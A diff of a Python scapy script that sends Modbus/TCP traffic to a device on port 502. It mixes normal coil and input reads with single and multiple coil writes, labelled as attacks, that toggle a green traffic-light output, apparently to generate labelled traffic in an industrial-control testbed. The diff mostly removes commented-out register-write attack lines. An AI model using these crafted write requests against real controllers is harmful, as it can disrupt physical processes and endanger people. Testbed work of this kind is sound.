@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-#  v0.0.3
+#  v0.0.5
 
 from scapy.all import *
 import argparse
@@ -22,9 +22,8 @@ sock.connect((args.dst_ip,502))
 stream = StreamSocket(sock)
 
 #Create various packets to send to the destination
-# #response=stream.sr(errorpacket)
-
-
+#Use the following line to test sending a specific packet rather than the rest of the script.
+#response=stream.sr(errorpacket)
 
 #Normal behaviour - checking the 3 coils
 read_coils=ModbusADURequest()/ModbusPDU01ReadCoilsRequest(startAddr=0,quantity=3)
@@ -34,11 +33,6 @@ read_discrete_inputs=ModbusADURequest()/ModbusPDU02ReadDiscreteInputsRequest(sta
 #Write good data to green tlight
 write_coil_low=ModbusADURequest()/ModbusPDU05WriteSingleCoilRequest(outputAddr=2,outputValue=0)
 write_coil_high=ModbusADURequest()/ModbusPDU05WriteSingleCoilRequest(outputAddr=2,outputValue=1)
-
-#Write to button
-#write_register_high=ModbusADURequest()/ModbusPDU06WriteSingleRegisterRequest(outputAddr=2,outputValue=1)
-#write_register_low=ModbusADURequest()/ModbusPDU06WriteSingleRegisterRequest(outputAddr=2,outputValue=0)
-
 
 write_multiple_coils_low=ModbusADURequest()/ModbusPDU0FWriteMultipleCoilsRequest(outputsValue=[0],startingAddr=2,quantityOutput=1)
 write_multiple_coils_high=ModbusADURequest()/ModbusPDU0FWriteMultipleCoilsRequest(outputsValue=[1],startingAddr=2,quantityOutput=1)
@@ -82,12 +76,6 @@ stream.sr(write_multiple_coils_high)
 print "Sent Multiple Coil Write Attack"
 time.sleep(0.5)
 
-#stream.sr(write_register_high)
-#time.sleep(1)
-#stream.sr(write_register_low)
-#print "Sent Register Write Attack"
-#time.sleep(0.5)
-
 for i in range(0,5): # 20
     stream.sr(read_coils)
     stream.sr(read_discrete_inputs)
@@ -121,12 +109,6 @@ time.sleep(1)
 stream.sr(write_multiple_coils_high)
 print "Sent Multiple Coil Write Attack"
 time.sleep(0.5)
-
-#stream.sr(write_register_high)
-#time.sleep(1)
-#stream.sr(write_register_low)
-#print "Sent Register Write Attack"
-#time.sleep(0.5)
 
 for i in range(0,5): # 20
     stream.sr(read_coils)
